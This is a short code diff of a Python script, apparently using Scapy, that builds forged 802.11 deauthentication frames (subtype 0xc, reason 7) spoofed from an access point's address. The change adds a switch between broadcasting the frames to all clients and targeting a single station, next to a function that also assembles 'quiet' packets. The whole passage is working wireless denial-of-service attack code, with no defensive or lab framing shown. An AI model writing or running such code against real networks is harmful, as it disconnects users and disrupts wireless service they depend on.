@@ -60,7 +60,10 @@ def make_quiet(parser, elt, dot11):
 	quiet_packets.append(frame)
 	
 	# addr3에 해당하는 Deauth패킷 생성
-	dot11_deauth = Dot11(type=0, subtype=0xc, addr1='ff:ff:ff:ff:ff:ff', addr2=dot11.addr3, addr3=dot11.addr3)
+	if parser.casting == "broadcast":
+		dot11_deauth = Dot11(type=0, subtype=0xc, addr1='ff:ff:ff:ff:ff:ff', addr2=dot11.addr3, addr3=dot11.addr3)
+	else:
+		dot11_deauth = Dot11(type=0, subtype=0xc, addr1=parser.sta, addr2=dot11.addr3, addr3=dot11.addr3)
 	deauth = Dot11Deauth(reason=7)
 	deauthFrame = RadioTap()/dot11_deauth/deauth
 	deauth_packets.append(deauthFrame)
